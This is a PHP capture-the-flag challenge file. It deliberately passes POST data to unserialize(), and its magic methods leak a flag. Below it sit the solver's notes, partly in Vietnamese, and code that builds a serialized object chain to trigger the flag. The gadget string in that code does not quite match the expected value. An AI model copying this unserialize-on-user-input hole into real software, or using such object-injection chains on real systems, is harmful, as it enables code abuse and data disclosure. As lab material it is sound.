<?php
     
$getflag = false;

class GetMessage {
    function __construct($receive) {
        if ($receive === "HelloBooooooy") {
            die("[FRIEND]: Ahahah you get fooled by my security my friend!<br>");
        } else {
            $this->receive = $receive;
        }
    }

    function __toString() {
        return $this->receive;
    }

    function __destruct() {
        global $getflag;
        if ($this->receive !== "HelloBooooooy") {
            die("[FRIEND]: Hm.. you don't see to be the friend I was waiting for..<br>");
        } else {
            if ($getflag) {
                include("flag.php");
                echo "[FRIEND]: Oh ! Hi! Let me show you my secret: ".$FLAG . "<br>";
            }
        }
    }
}

class WakyWaky {
    function __wakeup() {
        echo "[YOU]: ".$this->msg."<br>";
    }

    function __toString() {
        global $getflag;
        $getflag = true;
        return (new GetMessage($this->msg))->receive;
    }
}

if (isset($_GET['source'])) {
    highlight_file(__FILE__);
    die();
}

if (isset($_POST["data"]) && !empty($_POST["data"])) {
    unserialize($_POST["data"]);
}
      

# unserialization only call __toString() and __destruct()
# Bypass receive "HelloBooooooooy"
# Add waky propetier to construct WakyWaky
# $getflag = true ?
# Khởi tạo WakyWaky thì __wakeup luôn được call và __toString được thực thi
#   khi echo đối tượng nòa đó vì thế mà $this->msg phải là class WakyWaky

$msg1 = new GetMessage("HelloBoooooo");
$msg1->waky = new WakyWaky();
$msg1->waky->msg = new WakyWaky();
$test = serialize($msg1);
echo $test;
?>
      
